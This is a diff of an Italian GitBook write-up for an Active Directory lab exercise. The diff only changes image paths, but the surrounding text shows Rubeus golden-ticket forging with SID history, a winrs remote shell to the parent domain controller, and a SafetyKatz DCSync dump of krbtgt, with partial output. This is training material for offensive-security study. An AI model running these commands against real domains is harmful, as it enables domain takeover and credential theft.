@@ -1,6 +1,6 @@
 # LEARNING OBJECTIVE19
 
-<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 * Using DA access to dollarcorp.moneycorp.local, escalate privileges to\
   Enterprise Admin or DA to the parent domain, moneycorp.local using\
@@ -14,15 +14,15 @@ Abbiamo già l'hash krbtgt da dcorp-dc. Creiamo il TGT inter-realm e lo iniettia
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args evasive-golden /user:Administrator /id:500 /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-719815819-3726368948-3917688648 /sids:S-1-5-21-335606122-960912869-3279953914-519 /aes256:154cb6624b1d859f7080a6615adc488f09f92843879b3d914cbcb5a8c3cda848 /netbios:dcorp /ptt
 ```
 
-<figure><img src="../.gitbook/assets/image (10) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (10) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../.gitbook/assets/image (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 ```
 winrs -r:mcorp-dc.moneycorp.local cmd
 ```
 
-<figure><img src="../.gitbook/assets/image (2) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Fantastico!
 
@@ -32,7 +32,7 @@ Possiamo anche eseguire gli attacchi DCSync contro moneycorp. Utilizzare il segu
 C:\AD\Tools\Loader.exe -path C:\AD\Tools\SafetyKatz.exe -args "lsadump::evasive-dcsync /user:mcorp\krbtgt /domain:moneycorp.local" "exit"
 ```
 
-<figure><img src="../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 SAM Username : krbtgt Account Type : 30000000 ( USER\_OBJECT ) User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL\_ACCOUNT ) Account expiration : Password last change : 11/11/2022 9:46:24 PM Object Security ID : S-1-5-21-335606122-960912869-3279953914-502 Object Relative ID : 502
 
